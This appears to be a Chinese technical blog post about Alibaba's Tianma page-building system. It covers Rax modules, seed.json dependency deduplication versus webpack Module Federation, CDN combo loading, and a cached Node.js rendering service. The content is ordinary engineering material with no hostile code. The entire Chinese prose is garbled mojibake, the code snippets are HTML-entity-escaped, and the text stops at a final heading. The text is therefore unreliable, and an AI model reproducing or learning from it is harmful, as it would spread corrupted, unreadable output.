å¬èµ·æ¥å¾ˆåƒæ˜¯ä¸€ä¸ªä¼ ç»Ÿå‡½æ•°çš„å®šä¹‰äº†ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ª rax æ¨¡å—çš„èŒƒä¾‹ï¼š 123import &#123; createElement &#125; from &apos;rax&apos;;import View from &apos;rax-view&apos;;import Text from &apos;rax-text&apos;;export default function Mod(props) &#123; let defaultTheme = &#123; themeColor: &apos;#fff&apos; &#125;; let defaultAttr = &#123; hidden: false &#125;; let &#123; items = [], $theme: &#123;themeColor&#125; = defaultTheme, $attr: &#123;hidden&#125; = defaultAttr, &#125; = props.data; return ( &lt;View className=&quot;mod&quot; style=&#123;&#123; backgroundColor: themeColor &#125;&#125;&gt; &#123; hidden !== &apos;true&apos; ? &lt;Text&gt;æ¬¢è¿ä½¿ç”¨å¤©é©¬æ¨¡å—ï¼&lt;/Text&gt; : null &#125; &lt;View className=&quot;keys&quot;&gt; &#123; items.map(element =&gt; &#123; return (&lt;Text&gt;&#123;element.key&#125;&lt;/Text&gt;); &#125;) &#125; &lt;/View&gt; &lt;/View&gt; );&#125; å½“ç„¶ï¼Œä¸€å®šä¼šæœ‰éƒ¨åˆ†æ¨¡å—ï¼Œæ›´å¤æ‚ï¼Œæ¯”å¦‚æœ‰ç‚¹èµã€å…³æ³¨ç­‰ä¸åªæ˜¯ä¸€æ¬¡æ¸²æŸ“èƒ½è§£å†³çš„äº‹æƒ…ï¼Œè¿™éƒ¨åˆ†ä¸€æ–¹é¢æ˜¯å¯ä»¥ç»„ä»¶åŒ–çš„ï¼Œå†™æ¨¡å—çš„å¼€å‘è€…å¹¶ä¸éœ€è¦å…³å¿ƒåˆ°è¿™éƒ¨åˆ†é€»è¾‘ï¼Œè¿˜æ˜¯åªéœ€è¦ä¼ é€’ä¸€äº›ç”¨æˆ·ä¿¡æ¯ç»™åˆ°ç»„ä»¶å°±è¡Œã€‚å¦ä¸€è§’åº¦è€ƒè™‘ï¼Œå¦‚æœä¸€ä¸ªç‚¹èµæ¥å£å°±æœ‰Nä»½å®ç°ï¼Œå¯¹äºåç«¯æœåŠ¡è®¾è®¡æ¥è¯´æ˜¯ä¸æ˜¯ä¹Ÿæœ‰é—®é¢˜ï¼Œæ˜¯ä¸æ˜¯æ¨è¿›ç»Ÿä¸€ä¼šæ›´å¥½ï¼Ÿ æ¨¡å—ç ”å‘é“¾è·¯çš„è®¾è®¡ æ¨¡å—çš„ç ”å‘é“¾è·¯å…¶å®å’Œæ­£å¸¸å¼€å‘ä¸€ä¸ª npm åŒ…å·®åˆ«ä¸å¤§ï¼ŒåŸºäºå¾ˆå¤šçº¦å®šï¼Œæˆ‘ä»¬æä¾›äº†ä¸€äº›ä¾¿æ·çš„è„šæ‰‹æ¶ï¼Œä»¥åŠæœ‰æ”¯æŒæ’ä»¶åŒ–çš„æ„å»ºå™¨ï¼Œå¯ä»¥æä¾›ç»™å„ç§ä¸åŒä½†æœ‰é™çš„ DSL æ¨¡å—è¿›è¡Œæ„å»ºæ“ä½œã€‚ åŒæ—¶ç”±äºå¼€å‘è€…æœ‰ ISVã€å¤–åŒ…ã€å†…éƒ¨å‘˜å·¥ï¼Œå¯è§†åŒ–ç ”å‘è¿˜æ˜¯éå¸¸é‡è¦çš„ç¯èŠ‚ï¼Œå°½é‡æŠŠå“ªäº›å’Œå¼€å‘ä¸€ä¸ª npm æ¨¡å—æœ‰å·®å¼‚çš„ç‚¹ï¼Œéƒ½é€šè¿‡å¯è§†åŒ–ç ”å‘çš„æ–¹å¼æŠ¹å¹³ã€‚æˆ‘ä»¬ä¹Ÿæä¾›äº†åŒ…æ‹¬æœ¬åœ°æ¨¡å—ç®¡ç†ã€è°ƒè¯•ã€é¢„è§ˆã€schema ç¼–è¾‘å™¨ç­‰èƒ½åŠ›ï¼Œä»¥åŠä»£ç æ‰«æã€èµ„æºå­˜å‚¨ç­‰å‘å¸ƒæµç¨‹çš„ä¿éšœã€‚ å¦‚ä½•ç ”å‘æ¨¡å— æœåŠ¡ç«¯å› ä¸ºæœåŠ¡ç«¯ä¹Ÿæ˜¯æ¨¡å—çš„ç›®æ ‡è¿è¡Œç¯å¢ƒï¼Œç›®å‰åœ¨æœåŠ¡ç«¯è¿è¡Œæ¨¡å—çš„æ–¹å¼ä¸»è¦æœ‰æ¯”è¾ƒè€æ´¾çš„çº¯æ¨¡æ¿æ¸²æŸ“æ–¹å¼ï¼ˆéœ€è¦å¼€å‘è€…å•ç‹¬å†™ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶ç”¨äºç”Ÿæˆ html)ï¼Œä»¥åŠç°åœ¨é€æ¸æ™®åŠçš„ SSR æ–¹æ¡ˆã€‚å‰è€…è¶³å¤Ÿç®€å•ä¸”æœ‰ç¡®å®šæ€§ï¼Œåè€…é¢å‘æœªæ¥ä½†æ˜¯éœ€è¦æœ‰è¶³å¤Ÿå¤šç¨³å®šæ€§çš„ä¿éšœã€‚ å®¢æˆ·ç«¯å‰é¢ä¹Ÿæœ‰æåˆ°çš„ï¼Œä¸ºäº†è®©æ¨¡å—ç ”å‘è¶³å¤Ÿç®€å•ä¸”ä¿è¯æµé€šæ€§ï¼Œé¡µé¢çº§éœ€è¦æ‰¿æ‹…æ›´å¤šåŒ…æ‹¬æ•°æ®è¯·æ±‚ã€é¡µé¢å®¹å™¨åˆå§‹åŒ–ç­‰æ“ä½œã€‚ æ•°æ®è¯·æ±‚é€»è¾‘æ˜¯é¡µé¢é€»è¾‘ä¸­éå¸¸æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œç°åœ¨ä¼šæœ‰ä¸€äº›æ•°æ®é©±åŠ¨ UI å±•ç¤ºçš„æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯æ¥å£åˆå¹¶ã€åˆ†é¡µåˆ†å±ã€å®¹ç¾æ‰“åº•è¿™äº›éå¸¸é‡è¦çš„åŠŸèƒ½ã€‚åˆ†é¡µåˆ†å±å†³å®šäº†é¦–å±éœ€è¦å±•ç¤ºå“ªäº›å†…å®¹ï¼Œè¯·æ±‚å“ªäº›æ•°æ®ï¼Œç„¶åæ¥å£åˆå¹¶è´Ÿè´£å‡å°‘è¯·æ±‚æ•°ï¼ŒåŠ é€Ÿé¦–å±å±•ç¤ºï¼Œç„¶åå®¹ç¾æ‰“åº•ç¡®ä¿æœ€åä¸€å®šæ˜¯å¯ä»¥æœ‰å†…å®¹å±•ç¤ºç»™ç”¨æˆ·ï¼Œå³ä½¿æœ‰å„ç§ç½‘ç»œã€æœåŠ¡çš„é—®é¢˜ã€‚ è€Œé¡µé¢å®¹å™¨æ¸²æŸ“ï¼Œä¸»è¦è¿˜æ˜¯åŒ…æ‹¬æ»šåŠ¨å®¹å™¨çš„åˆå§‹åŒ–ï¼Œå¤šç»´æ¨¡å—åˆ—è¡¨çš„æ¸²æŸ“ã€‚æ¯”å¦‚æŠŠä¸€ç»´çš„æ¨¡å—åˆ—è¡¨æ¸²æŸ“æˆå¤štabçš„çˆ¶å­å…³ç³»ï¼Œä»¥åŠæœ€åéœ€è¦å•ç‹¬åˆå§‹åŒ–ä¸€ä¸ªä¸ªæ¨¡å—ã€‚ æ­å»ºçš„æ ¸å¿ƒè®¾è®¡-ä¾èµ–å»é‡ ä¸Šé¢çš„å¤§éƒ¨åˆ†å†…å®¹å’Œä¸­åå°æ­å»ºè¿˜æ˜¯æ¯”è¾ƒç±»ä¼¼ï¼Œåªæ˜¯å„è‡ªæœ‰ä¸€äº›çº¦å®šã€‚æ¥ä¸‹æ¥å°±æ˜¯å¤©é©¬çš„è®¾è®¡ä¸­æ¯”è¾ƒæœ‰å·®å¼‚çš„åœ°æ–¹äº†ã€‚ä¸­åå°æ­å»ºé€šå¸¸éƒ½åªéœ€è¦åœ¨ npm åŒ…ç»„ä»¶çš„åŸºç¡€ä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ª schema æè¿°ï¼Œå°±å¯ä»¥ç”¨äºåœ¨æ­å»ºç³»ç»Ÿä¸­ç”Ÿæˆå¯¹åº”çš„è¡¨å•é…ç½®äº†ï¼Œnpm ç»„ä»¶ä¼šåœ¨å‘å¸ƒçš„æ—¶å€™æ„å»ºåˆ°é¡µé¢ bundle ä¸­ã€‚è€Œæ˜¯æ¶ˆè´¹è€…ç«¯çš„ä¸è¡Œï¼Œç›®å‰æ¯ä¸ªæ¨¡å—éœ€è¦å•ç‹¬è¿›è¡Œæ„å»ºï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼Ÿ èƒŒæ™¯ æŸæ¬¡æ´»åŠ¨ï¼Œå¤§æ¦‚ç”¨åˆ°äº†100+çš„æ¨¡å—ï¼Œæ­å»ºå‡ºäº†1000+çš„é¡µé¢ã€‚ç„¶åæœ‰ä¸ªåŠŸèƒ½éœ€è¦åœ¨çŸ­æ—¶é—´å†…å¯¹ç‰¹å®šå‡ ä¸ªæ¨¡å—è¿›è¡Œç‰ˆæœ¬å‡çº§æ“ä½œã€‚å¦‚æœæ¯ä¸ªé¡µé¢éƒ½éœ€è¦æ„å»ºæ‰èƒ½ç”Ÿæ•ˆï¼ŒçŸ­æ—¶é—´å†…è¿›è¡Œå¤§é‡æ„å»ºçš„å¯æ“ä½œæ€§æ˜¯æ¯”è¾ƒä½çš„ï¼Œç‰¹åˆ«æ˜¯å¤æ‚çš„ webpack æ„å»ºè€—æ—¶è¿˜æ˜¯éå¸¸é•¿çš„ã€‚ åœ¨ä¸ªæ€§åŒ–ã€åƒäººå‰é¢æ™®åŠåï¼Œé¡µé¢çš„å±•ç¤ºæ˜¯ç”±æ•°æ®æ¥é©±åŠ¨çš„ï¼Œå¦‚æœç”¨ä¼ ç»Ÿçš„æ„å»ºæ–¹æ¡ˆï¼Œæ— æ³•å‡†ç¡®åšåˆ°é¦–å±åªåŠ è½½é¦–å±æ¨¡å—ï¼Œå› ä¸ºé¦–å±æœ¬èº«åŒ…å«å“ªä¸ªæ¨¡å—ä¸æ˜¯ç”± bundle å†³å®šï¼Œè€Œæ˜¯ç”±æ•°æ®å†³å®šçš„ã€‚ æ•°æ®é©±åŠ¨å±•ç° å› ä¸ºæ­å»ºçš„æœ€å°å•ä½æ˜¯æ¨¡å—ï¼Œä¸”ä¸šåŠ¡ä¸Šæœ‰å¤§é‡åŠ¨æ€æ€§çš„è¦æ±‚ï¼Œæ¯”å¦‚æŸä¸€å¤©10ç‚¹éœ€è¦å‡çº§1000ä¸ªé¡µé¢çš„å…¶ä¸­5ä¸ªæ¨¡å—çš„ç‰ˆæœ¬ï¼ŒæŠŠè¿™1000ä¸ªé¡µé¢è¿›è¡Œé‡æ–°æ„å»ºå‘å¸ƒæ“ä½œæ€§è¾ƒä½ï¼Œæ‰€ä»¥ç»„è£…æ¨¡å—çš„è¿‡ç¨‹æ˜¯é€šè¿‡çº¿ä¸Šæ¸²æŸ“æœåŠ¡è®¡ç®— assets combo uri å®ç°çš„ï¼Œåªè¦åœ¨æ“ä½œåå°ç‚¹å‡»ä¸€ä¸‹æ¨¡å—å‡çº§ï¼Œè¿™1000ä¸ªé¡µé¢ä¼šè‡ªåŠ¨æ›´æ–°æ¨¡å—ç‰ˆæœ¬è€Œä¸éœ€è¦é‡æ–°èµ°ä¸€æ¬¡æ„å»ºé€»è¾‘ã€‚è¿™ä¹Ÿæ„å‘³ç€æ¯ä¸ªæ¨¡å—éœ€è¦å•ç‹¬æ‰“åŒ…ï¼Œç»™å‡ºä¸€ä¸ªå·²ç»å¯ä»¥åœ¨æµè§ˆå™¨ä¸Šè¿è¡Œçš„ web ç‰ˆæœ¬ã€‚ ä½†æ˜¯ç”±äºæ¯ä¸ªæ¨¡å—å•ç‹¬æ‰“åŒ…ï¼Œå¦‚æœå•¥éƒ½ä¸åšï¼Œä¼šé€ æˆä¾èµ–é‡å¤åŠ è½½çš„é—®é¢˜ã€‚é‚£ä¹ˆå°±éœ€è¦æŠŠæ¨¡å—çš„ä¾èµ– dependecies éƒ½ external æ‰ï¼ˆä¹Ÿæ”¯æŒä¸»åŠ¨é€‰æ‹©éƒ¨åˆ†æ‰“åŒ…ï¼‰ï¼Œä¸ºäº†ç¡®ä¿ä¸é‡å¤åŠ è½½ä¾èµ–æ¨¡å—é€ æˆé¡µé¢å¤§å°ä¸å¯æ§ï¼Œå¼•å…¥äº† seed æè¿°ä¾èµ–çš„æœºåˆ¶ã€‚ 1&#123; &quot;modules&quot;: &#123; &quot;@ali/pmod-ark-butian-test/index&quot;: &#123; &quot;requires&quot;: [ &quot;@ali/rax-pkg-rax/index&quot;, &quot;@ali/rax-pkg-rax-view/index&quot;, &quot;@ali/rax-pkg-rax-text/index&quot; ] &#125; &#125;, &quot;packages&quot;: &#123; &quot;@ali/rax-pkg-rax&quot;: &#123; &quot;path&quot;: &quot;//g.alicdn.com/rax-pkg/rax/1.0.15/&quot;, &#125;, &quot;@ali/rax-pkg-rax-view&quot;: &#123; &quot;path&quot;: &quot;//g.alicdn.com/rax-pkg/rax-view/1.0.1/&quot;, &#125;, &quot;@ali/rax-pkg-rax-text&quot;: &#123; &quot;path&quot;: &quot;//g.alicdn.com/rax-pkg/rax-text/1.0.2/&quot;, &#125;, â€œ@ali/pmod-module-testâ€: &#123; &quot;path&quot;: &quot;//g.alicdn.com/pmod/module-test/0.0.9/&quot;, &#125; &#125;&#125; å…‰æœ‰ä¸€ä¸ªæè¿°è‚¯å®šä¸å¤Ÿï¼Œæ ¸å¿ƒè¿˜éœ€è¦ç¡®å®šä¸€ä¸ªç­–ç•¥ï¼Œæ¨¡å—ä¾èµ–åŒä¸ª npm åŒ…çš„ä¸åŒç‰ˆæœ¬ï¼Œåº”è¯¥å¦‚ä½•é€‰æ‹©ã€‚npm å®‰è£…çš„æ–¹å¼æ˜¯å…¼å®¹ç‰ˆæœ¬å–æœ€å¤§ï¼Œä¸å…¼å®¹æˆ–è€…æŒ‡å®šç‰ˆæœ¬çš„æ—¶å€™å®‰è£…å¤šä»½çš„ç­–ç•¥ã€‚web ä¸Šçš„ç­–ç•¥ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œåªæ˜¯å†…éƒ¨çš„ç ”å‘æ›´å¯æ§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªç­–ç•¥åšäº†æ›´å¤šçš„ç®€åŒ–ï¼ˆä»¥x,y,zç‰ˆæœ¬ä¸ºä¾‹ï¼‰ï¼š x ä½å¤§ç‰ˆæœ¬å¯ä»¥å…±å­˜ï¼ˆä¹Ÿå¯ä»¥é€‰æ‹©ä¸å…±å­˜ï¼‰ yï¼Œzä½ç‰ˆæœ¬å˜åŒ–éƒ½æ˜¯å‘å‰å…¼å®¹çš„ï¼Œä¼šè‡ªåŠ¨å–å…¼å®¹ä¸‹çš„æœ€æ–°ï¼Œå³ä½¿æŒ‡å®šäº†ç‰ˆæœ¬ã€‚ ä» web å’Œç”¨æˆ·ä¾§çš„è§’åº¦è€ƒè™‘ï¼ŒåŠ è½½å¤§é‡åŒç»„ä»¶çš„ä¸åŒç‰ˆæœ¬åªä¼šé€ æˆé¡µé¢ä½“ç§¯çš„è†¨èƒ€ï¼Œå¸¦æ¥å¸¦å®½ã€æµé‡çš„æµªè´¹ï¼Œä»¥åŠç”¨æˆ·ä¾§è¾ƒå·®çš„ä½“éªŒã€‚ æœ¬è´¨ä¸Šï¼Œå°±æ˜¯æŠŠåŸæœ¬ webpack å¸®å¼€å‘è€…åšçš„å†…éƒ¨ä¾èµ–ç®¡ç†ï¼ŒæŠ½è±¡æå–å‡ºæ¥ï¼Œåœ¨é¡µé¢çº§ç»Ÿä¸€è¿›è¡Œç®¡ç†ã€‚ seed æœºåˆ¶ä¸ webpack seed.json ä¾èµ–å…³ç³»çš„é—®é¢˜ç¬¬ä¸€ä¸ªï¼Œç§æœ‰å®ç°å¸¦æ¥çš„ç†è§£å’Œæ„å»ºæˆæœ¬å¤©é©¬ç›®å‰çš„ seed é…ç½®æ ¸å¿ƒé—®é¢˜åœ¨äºè¿™æ˜¯ä¸€ä¸ªéå¸¸ç§æœ‰çš„å®ç°ï¼Œæ‰€æœ‰ç»„ä»¶è¦è¿›å…¥å¤©é©¬ä½“ç³»å¹¶ä¸”æœ‰å»é‡èƒ½åŠ›ï¼Œå°±å¾—é‡æ–°æ„å»ºä»¥æ­¤ç”Ÿæˆ seedã€‚ è¿™ä¸ªé—®é¢˜åœ¨æ–°ä¸šåŠ¡æ¥å…¥å¤©é©¬çš„æ—¶å€™ä¼šæ¯”è¾ƒæ˜æ˜¾ï¼Œå› ä¸ºé¡µé¢çº§å»é‡èƒ½åŠ›æ˜¯åŸºäº seed é…ç½®æ¥çš„ï¼Œè€Œ seed çš„åŸå§‹æ¥æºæ˜¯ç»„ä»¶å†…éƒ¨çš„ seed.jsonï¼Œä¹Ÿå°±æ˜¯è¯´ä½ è¦å…ˆæŠŠç»„ä»¶å†…çš„ package.json dependencies è½¬æˆ seed.jsonï¼Œç„¶åè¿™ä¸ªç»„ä»¶æ‰èƒ½è¢«æ”¶é›†ä¾èµ–ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆéœ€è¦æŠŠç»„ä»¶åœ¨å¤©é©¬ä¸Šæ³¨å†Œä¸€æ¬¡ï¼Œæ³¨å†Œçš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯ç”Ÿæˆå¯¹åº” seed çš„è¿‡ç¨‹ã€‚ç›®å‰è¿™ä¸ªè¿‡ç¨‹æ˜¯æ‰‹åŠ¨å¼•å…¥ç»„ä»¶ç„¶åæäº¤ä¸€ä»½åˆ°å¤©é©¬ã€‚åç»­å¤©é©¬æ¨¡å—ä¸­å¿ƒä¼šæä¾›è‡ªåŠ¨æ³¨å†Œçš„èƒ½åŠ›ã€‚ é‚£ä¸ºä»€ä¹ˆæ²¡æœ‰ç›´æ¥æ ¹æ® package.json æ¥è¿›è¡Œæ³¨å†Œçš„æ–¹å¼å‘¢ï¼Œæ¯•ç«Ÿ seed ä¹Ÿæ˜¯ç”± package.json dependencies ç”Ÿæˆçš„ã€‚ ä¸»è¦åŸå› æœ‰ï¼š package.json é‡Œå£°æ˜çš„ä¾èµ–å¹¶ä¸ä¸€å®šä¼šç”¨åˆ°ï¼Œè¿˜éœ€è¦è¯»å–çœŸå®çš„ import å¼•ç”¨æƒ…å†µ package.json é‡Œå£°æ˜çš„ä¾èµ–å¹¶ä¸ä¸€å®šéƒ½æ˜¯å…¬å…±ä¾èµ–ï¼Œå†…éƒ¨ä¾èµ–å°±ç›´æ¥æ‰“åŒ…æ‰äº†ï¼Œä¸ç„¶ä¸å…¬å…±çš„ä¾èµ–æ”¾åˆ° seed é‡Œï¼Œseed æœ¬èº«çš„ä½“ç³»ä¼šéå¸¸å¤§ å…¬å…±ç»„ä»¶éœ€è¦å‘å¸ƒä¸€ä»½åˆ° cdnï¼Œå¹¶è½¬æˆ Web ä¸Šå¯è¿è¡Œçš„ CMD/UMD/AMD ç­‰ç­‰ï¼Œæœ¬èº«ä¹Ÿéœ€è¦ä¸€ä¸ªæ„å»ºè¿‡ç¨‹ã€‚ ç¬¬äºŒä¸ªï¼Œå¯¹å¤æ‚ loader çš„ä¾èµ–ç”±äº seed æ–‡ä»¶çš„å­˜åœ¨å¹¶ä¸”åŒ…å«æ¯”è¾ƒå¤šçš„å…³ç³»æè¿°ï¼Œéœ€è¦ä¸€ä¸ªç›¸å¯¹å¤æ‚çš„ loader æ¥è§£æè¿™ä¸ªæè¿°ï¼Œå°è¯•è¿‡åŸºäº SystemJs è¿›è¡Œæ‰©å±•ï¼Œä½†æ˜¯åŠ¨æ€æ€§ä¸Šè¿˜æ˜¯æ— æ³•å’ŒåŸæœ¬è‡ªç ”çš„ loader ç›¸æå¹¶è®ºã€‚æœ‰å…´è¶£çš„åŒå­¦ä¹Ÿå¯ä»¥çœ‹ä¸‹ KISSY 3 çš„ loader å®ç°ã€‚ webpack Module Federation å¯èƒ½çš„é—®é¢˜1. HTML çš„ç»„ç»‡åŸºäº seed json æ ¼å¼ï¼Œ wormhole é›†æˆäº†é€šè¿‡ seed.json ç”Ÿæˆ HTML çš„èƒ½åŠ›ã€‚å¼€å‘è€…å¯ä»¥ä¸éœ€è¦å…³æ³¨ HTML å¦‚ä½•ç”Ÿæˆï¼Œå› ä¸º loader çš„ä¿éšœï¼Œé¡ºåºä¹Ÿæ²¡æœ‰é‚£ä¹ˆé‡è¦ã€‚ åœ¨ Module Federation çš„ä½¿ç”¨æƒ…å†µä¸‹ï¼ŒHTML è¿˜æ˜¯ä¾èµ–é¡µé¢çº§æ„å»ºï¼Œå¦‚æœéœ€è¦åœ¨ç±»ä¼¼æ­å»ºåœºæ™¯ä¸‹åŠ¨æ€æ‹¼è£… HTMLï¼Œè¦ä¸å°±åŠ è½½æ‰€æœ‰çš„ remoteEntry æ–‡ä»¶ï¼Œè¦ä¸å°±æ˜¯å¾—è‡ªå·±æå‡ºä¸€ä¸ªä¾èµ–å…³ç³»å‡ºæ¥ç»™åˆ°æœåŠ¡ç«¯ç”Ÿæˆã€‚ å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ SSRï¼Œè¿™æ ·çš„è¯ï¼Œå°±éœ€è¦å¦å¤–ä¸€ä¸ªé…ç½®æ¥æ‰“åŒ…ä¸€ä¸ª SSR ç‰ˆæœ¬çš„ä»£ç ï¼Œæ¯•ç«ŸæœåŠ¡ç«¯æŒ‰éœ€æ„ä¹‰æ²¡æœ‰é‚£ä¹ˆå¤§ï¼Œå¹¶ä¸”ï¼ŒSSR å¤§æ¦‚ç‡ä¹Ÿåªèƒ½è¦†ç›–é¡µé¢çš„éƒ¨åˆ†å†…å®¹ï¼Œå‰©ä¸‹çš„è¿˜æ˜¯è¦é¢ä¸´å¦‚ä½•ç»„ç»‡ HTML çš„èµ„æºå¼•ç”¨çš„é—®é¢˜ã€‚ 2. å†—ä½™çš„ä»£ç å› ä¸º Module Federation æŠŠä¾èµ–éƒ½é€šè¿‡ä»£ç çš„æ–¹å¼æ‰“åŒ…åˆ°äº† remoteEntry æ–‡ä»¶é‡Œï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šå­˜åœ¨å¾ˆå¤šé‡å¤å®šä¹‰çš„ä»£ç ã€‚æ¯”å¦‚ webpack _require ä¸‹çš„ä¸€å †å‡½æ•°ï¼ŒremoteEntry åŠ è½½å¤šäº†ï¼Œè¿™ä¸ªé—®é¢˜ä¼šç›¸å¯¹ä¸¥é‡ä¸€äº›ã€‚ ä¸è¿‡å¯¹æ¯”ç›®å‰å¤©é©¬ä¾èµ–å¤„ç†ä½“ç³»æ¥è¯´ï¼Œfeloader æœ¬èº«å› ä¸ºå†å²åŸå› +æ”¯æŒäº†KMD/CMD/AMDç­‰å¤šç§æ¨¡å—æ ¼å¼ï¼Œä¹Ÿæœ‰ç‚¹å°ºå¯¸è¿‡å¤§ï¼Œæ‰€ä»¥ä¹Ÿæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚ 3. CDN comboé€šè¿‡ seed.json æè¿°çš„ä¾èµ–å…³ç³»ï¼Œæ˜¯å¯ä»¥å¿«é€Ÿè§£æåˆ°ä¸€ä¸ª combo æ ¼å¼ä¸Šçš„ï¼Œé€šè¿‡ä¸€ä¸ªè¯·æ±‚æŠŠä¾èµ–çš„è„šæœ¬åˆå¹¶å–åˆ°ã€‚è€Œç›®å‰ Module Federation æ¯ä¸ª remoteEntry éƒ½æ˜¯ç‹¬ç«‹å¤„ç†ï¼Œè™½ç„¶å¯¹æ¯” SystemJs æˆ–è€…å…¶ä»– webpack åˆ†åŒ…æ’ä»¶ï¼Œæœ‰èƒ½åŠ›å¤„ç†æ·±åº¦ä¾èµ–ï¼ˆä¾èµ–çš„ä¾èµ–ä¸é‡å¤åŠ è½½ï¼‰ï¼Œä½†æ˜¯ç¼ºä¹ä¸€ä¸ªåˆå¹¶èƒ½åŠ›ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸²è¡ŒåŠ è½½ä¾èµ–çš„æƒ…å†µï¼Œä¸è¿‡è¿™ä¸ªé—®é¢˜æ‰©å±•ä¸‹ trunk loaderï¼Œåˆå¹¶ä¾èµ–ç»„ä»¶ promise å‡½æ•°çš„å¤„ç†ï¼Œä¸æ˜¯å¾ˆéš¾è§£å†³ã€‚ æ­å»ºçš„æ ¸å¿ƒè®¾è®¡-æ¸²æŸ“æœåŠ¡ ä¸Šé¢è®²çš„æ›´å¤šè¿˜æ˜¯å›´ç»•æ­å»ºçš„ç‰©æ–™ï¼Œå¤©é©¬è¿˜æä¾›äº†é€šç”¨çš„ Node.js åœ¨çº¿æ¸²æŸ“å¼•æ“ï¼Œç”¨äºæä¾›ç»Ÿä¸€çš„æ¸²æŸ“æœåŠ¡ï¼Œåªè¦é€šè¿‡å¤©é©¬æ­å»ºçš„äº§ç‰©ï¼Œéƒ½å¯ä»¥è¢«æ¸²æŸ“æœåŠ¡æ¶ˆè´¹ï¼Œå¹¶æ¸²æŸ“å‡ºæœ€åçš„ç»“æœç»™åˆ°ç”¨æˆ·è®¿é—®ã€‚ æ¨¡æ¿æ¸²æŸ“æœ¬èº«æ²¡æœ‰ç‰¹åˆ«çš„ç‚¹ï¼Œä¸»è¦è¯´ä¸€äº›ä¸åŒçš„ã€‚ å¤šç»ˆç«¯çš„ç¼“å­˜ é¢å‘é˜¿é‡Œå¤§æµé‡çš„åœºæ™¯ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸€å¥—å¤šç»ˆç«¯çš„ç¼“å­˜æ–¹æ¡ˆï¼š æ¨¡å—æ˜¯æ”¯æŒè·¨ç»ˆç«¯çš„ï¼Œé‚£é¡µé¢ä¹Ÿè‚¯å®šæ˜¯è·¨ç»ˆç«¯çš„ã€‚è€Œè¿™èƒŒåæ˜¯éœ€è¦ç»Ÿä¸€çš„ç»ˆç«¯è¯†åˆ«æ¶æ„æ¥æ”¯æ’‘çš„ã€‚ç›®å‰æ­å»ºäº§ç‰©çš„é¡µé¢éƒ½æ˜¯æ‰˜ç®¡åœ¨ä¸€å¥—ç¼“å­˜+æºç«™æ¶æ„ä¸‹çš„ï¼Œä¸åŒçš„ç«¯ä¼šæœ‰ä¸€ä»½å¯¹åº”çš„ç¼“å­˜å‰¯æœ¬ï¼Œé¿å…æ¯æ¬¡è®¿é—®éƒ½éœ€è¦é‡æ–°æ¸²æŸ“ã€‚ åŸºäºè¿™æ ·ä¸€å¥—æ¶æ„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å®ç°è¿è¥åªéœ€è¦æŠ•æ”¾ä¸€ä¸ªåœ°å€æˆ–è€…äºŒç»´ç ï¼Œåœ¨ä¸åŒçš„ç«¯å°±æœ‰ä¸åŒçš„å±•ç°æ–¹å¼ã€‚ é«˜æ€§èƒ½ä¿éšœ åœ¨æ”¯æŒè·¨ç»ˆç«¯çš„åŒæ—¶ï¼Œæ¸²æŸ“å¼•æ“ä¹Ÿæ‰¿æ‹…ç€ç±»ä¼¼ webpack HtmlWebpackPlugin çš„èŒè´£ï¼Œæ­å»ºç³»ç»Ÿå‘å¸ƒå‡ºæ¥çš„ç»“æœæ˜¯ä¸€ä¸ªåŒ…å«é¡µé¢ç»“æ„ã€ä¾èµ–å…³ç³»çš„æè¿°ã€‚æ¸²æŸ“å¼•æ“é€šè¿‡è¿™ä¸ªæè¿°æ¸²æŸ“å‡º HTMLã€weex bundle ç­‰ã€‚å½“ç„¶è¿™ä¸ªè¿‡ç¨‹ä¼šæœ‰ä¸€äº›è€—æ—¶ï¼Œä¸»è¦æ˜¯åœ¨ä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†ï¼š æ‹‰å–æ¨¡å—çš„èµ„æºæ–‡ä»¶ï¼Œæ–‡ä»¶éœ€è¦ä» OSS è¿œç¨‹æ‹‰å– è®¡ç®—æ•´ä¸ªé¡µé¢æœ€ç»ˆçš„ä¾èµ–å…³ç³» å› ä¸ºæ¸²æŸ“æœåŠ¡æ˜¯åœ¨çº¿çš„ï¼Œç®—æ˜¯åŸºäº CDN ç¼“å­˜æ¶æ„çš„å®æ—¶æ¸²æŸ“ï¼ˆæ¯éš”ä¸€æ®µæ—¶é—´è‡ªåŠ¨æ›´æ–°å›æºï¼‰ï¼Œå¦‚æœä¸ webpack ä¸€æ ·æ„å»ºé€Ÿåº¦ç¼“æ…¢çš„è¯ï¼Œè¿˜æ˜¯éå¸¸ç³Ÿç³•çš„äº‹æƒ…ã€‚æ‰€ä»¥åœ¨è¿™é‡Œä¹Ÿåšäº†å¾ˆå¤šåŒ…æ‹¬ä¾èµ–å…³ç³»è®¡ç®—çš„ç¼“å­˜ã€æ–‡ä»¶çš„ç¼“å­˜ç­‰ç­‰ã€‚ç„¶åå†é€šè¿‡ CDN ç¼“å­˜çš„èƒ½åŠ›ï¼Œæå‡æ•´ä½“çš„è®¿é—®é€Ÿåº¦ã€‚ åŒæ—¶ä¸ºäº†æå‡ç”¨æˆ·è®¿é—®ä½“éªŒï¼Œæ¸²æŸ“å¼•æ“çš„éƒ¨ç½²èŒƒå›´æ˜¯å¤§äºæ­å»ºæœåŠ¡çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨å›½é™…åŒ–åœºæ™¯ä¸‹ï¼Œæ¸²æŸ“å¼•æ“å·²ç»éƒ¨ç½²åˆ°äº†äºšæ¬§ç¾ï¼Œå¹¶ä¸”ä¸ºè¿™äº›å›½å®¶ä¸“é—¨åšäº† OSS æ–‡ä»¶åŒæ­¥ä¼˜åŒ–ã€‚ æœªæ¥å±•æœ› seed ä½“ç³»ä¸ webpack çš„é•¿æœŸèåˆæ–¹æ¡ˆ 